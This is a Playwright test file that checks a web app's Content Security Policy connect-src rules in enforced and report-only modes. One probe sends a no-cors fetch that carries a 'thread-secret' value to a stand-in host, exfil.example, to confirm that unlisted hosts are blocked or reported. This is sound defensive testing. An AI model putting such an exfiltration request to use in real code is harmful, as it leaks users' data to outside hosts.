import { expect, test, type Page } from '@playwright/test';
import {
  connectSources,
  connectSrcReportOnly,
  type CspEnv,
} from '../../src/lib/csp';

/**
 * GOO-729: the explicit connect-src list from src/lib/csp.ts.
 *  - Enforced (what a follow-up will ship): API fetch, Supabase auth and an
 *    XHR upload still work; an unlisted host is blocked before any request
 *    leaves the page.
 * WebSockets are not probed here: a Playwright-routed WebSocket connects even
 * under `connect-src 'self'` (checked against Chromium), so it cannot show
 * CSP behavior. The WebSocket origin is covered by csp.connect.test.ts.
 *  - Report-only (what ships now): the unlisted request still goes through,
 *    and the browser raises a report-disposition violation for it.
 */
const host = 'https://csp-connect.test';
const env: CspEnv = {
  NODE_ENV: 'production',
  NEXT_PUBLIC_API_URL: 'https://api.csp-connect.test/api/v1',
  NEXT_PUBLIC_SUPABASE_URL: 'https://auth.csp-connect.test',
};
const pageUrl = new URL(`${host}/chat`);

async function serve(
  page: Page,
  headers: Record<string, string>
): Promise<string[]> {
  const thirdParty: string[] = [];
  await page.route('https://exfil.example/**', (route) => {
    thirdParty.push(route.request().url());
    return route.fulfill({ status: 204 });
  });
  await page.route('https://api.csp-connect.test/**', (route) =>
    route.fulfill({ json: { ok: true } })
  );
  await page.route('https://auth.csp-connect.test/**', (route) =>
    route.fulfill({ json: { user: null } })
  );
  await page.route(`${host}/**`, (route) =>
    route.fulfill({
      contentType: 'text/html',
      headers,
      body: `<!doctype html><body><script>
        window.violations = [];
        document.addEventListener('securitypolicyviolation', (e) =>
          window.violations.push({ uri: e.blockedURI, disposition: e.disposition }));
      </script></body>`,
    })
  );
  await page.goto(pageUrl.toString());
  return thirdParty;
}

type Probe = Record<'api' | 'auth' | 'upload' | 'exfil', 'ok' | 'blocked'>;

async function probe(page: Page): Promise<Probe> {
  return page.evaluate(async () => {
    const attempt = async (
      fn: () => Promise<unknown>
    ): Promise<'ok' | 'blocked'> => {
      try {
        await fn();
        return 'ok';
      } catch {
        return 'blocked';
      }
    };
    const upload = (): Promise<void> =>
      new Promise<void>((resolve, reject) => {
        const xhr = new XMLHttpRequest();
        xhr.open(
          'POST',
          'https://api.csp-connect.test/api/v1/documents/upload'
        );
        xhr.onload = () => resolve();
        xhr.onerror = () => reject(new Error('xhr'));
        xhr.send(new Blob(['pdf']));
      });
    return {
      api: await attempt(() =>
        fetch('https://api.csp-connect.test/api/v1/documents')
      ),
      auth: await attempt(() =>
        fetch('https://auth.csp-connect.test/auth/v1/user')
      ),
      upload: await attempt(upload),
      exfil: await attempt(() =>
        fetch('https://exfil.example/collect?d=thread-secret', {
          mode: 'no-cors',
        })
      ),
    };
  });
}

test('enforced: listed origins work, an unlisted host is blocked', async ({
  page,
}) => {
  const thirdParty = await serve(page, {
    'Content-Security-Policy': `connect-src ${connectSources(env, pageUrl).join(' ')}`,
  });
  expect(await probe(page)).toEqual({
    api: 'ok',
    auth: 'ok',
    upload: 'ok',
    exfil: 'blocked',
  });
  expect(thirdParty).toEqual([]);
});

test('report-only: an unlisted host is reported, not blocked', async ({
  page,
}) => {
  const thirdParty = await serve(page, {
    'Content-Security-Policy-Report-Only': connectSrcReportOnly(env, pageUrl),
  });
  expect(await probe(page)).toEqual({
    api: 'ok',
    auth: 'ok',
    upload: 'ok',
    exfil: 'ok',
  });
  expect(thirdParty).toHaveLength(1);
  const violations = await page.evaluate(
    () =>
      (
        window as unknown as {
          violations: { uri: string; disposition: string }[];
        }
      ).violations
  );
  // Only the unlisted host is reported, and only as a report.
  expect(violations.length).toBeGreaterThan(0);
  for (const violation of violations) {
    expect(violation.disposition).toBe('report');
    expect(new URL(violation.uri).host).toBe('exfil.example');
  }
});
